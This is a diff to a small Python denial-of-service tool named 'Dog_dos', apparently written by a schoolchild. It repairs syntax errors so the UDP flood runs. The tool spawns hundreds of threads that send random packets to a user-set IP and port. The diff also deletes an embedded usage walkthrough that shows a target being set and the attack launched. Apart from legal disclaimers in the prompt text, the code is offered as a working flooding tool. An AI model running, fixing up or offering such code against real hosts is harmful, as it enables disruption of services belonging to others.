@@ -1,13 +1,13 @@
-"""
+'''
 Author: Lucky Pupil ;
 Date:2022.05.01 ;
 National: Chinese ;
 Project Name: Dos Attack ;
 Education: Fifth grade of primary school
-"""
+'''
 import socket #导入攻击库
 from threading import Thread # 导入多线程库
-from cmd import Cmd# 导入终端库
+import cmd
 from sys import exit # 为了使用exit函数
 from time import sleep# 为了使用sleep函数
 
@@ -17,12 +17,12 @@ so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # 生成攻击服务器
 threads = [] # 多线程列表
 
 
-class Main(Cmd):
+class Main(cmd.Cmd):
 	prompt = 'Dog_dos>' # 终端前缀
 	intro = '本工具仅限学习与装逼使用，请勿用于违法用途\n根据《刑法》第二百八十五条规定\n侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。\n如非法使用，后果自负' #终端提示语
 	
 	def __init__(self):
-		super(Cmd).__init__()
+		super(Main,self).__init__()
 		self.thread = 500
 		self.port = 80
 		
@@ -79,14 +79,14 @@ class Main(Cmd):
 			self.true_to_attack() # attack
 		elif chose == 'n' or chose == 'N':
 			self.exit()# 退出
-		elif:
+		else:
 			print('请规范输入') #用户输入错误，让他再输一遍
 			self.attack()
 			
 	def true_to_attack_attack(self): # 攻击主体部分
 		for i in range(20001):# 重复20002次，可以随意调整
 			try:
-				so.sendto(randbyte,(self.ip,self.port)) # 发送数据包，格式(socket.sendto(data,(IP,port)))
+				so.sendto(randbyte,(self.ip,self.port)) # 发送数据包，格式socket.sendto(data,(IP,port))
 			except Exception:
 				print('您没有设置IP地址或者没有正确设置IP地址')
 				break
@@ -106,27 +106,3 @@ class Main(Cmd):
 
 
 Main().cmdloop()
-
-
-
-'''
-此项目的使用方法
-C:\Users\Pupil>python -m dos_attack_Chinese #这一步是为了运行程序，程序最好在cmd里运行，作者亲测，在Sublime里运行无效
-根据《刑法》第二百八十五条规定，侵入国家事务，尖端科学技术信息科技系统，处三年以下有期徒刑或拘留，后果自负
-dog_dos>set_port 80 #这一步是为了设置被攻击端端口
-Set port 80
-dog_dos>set_thread_num 250 #这一步是为了设置攻击时线程数量
-Set thread_num 250
-dog_dos>set_ip 192.168.3.1 #这一步是为了设置IP
-Set IP address 192.168.3.1
-dog_dos>attack #这一步是为了攻击
-你真的要攻击吗？根据《刑法》第二百八十五条规定，侵入国家事务，尖端科学技术信息科技系统，处三年以下有期徒刑或拘留（确认输y，退出输n) y #这只是一步防止误操作，导致一不小心让一些服务器比较小的网站崩溃。输y就行
-生成第1个线程
-生成第2个线程
-生成第3个线程
-......
-这是第1攻击
-这是第2攻击
-这是第1攻击
-......
-'''
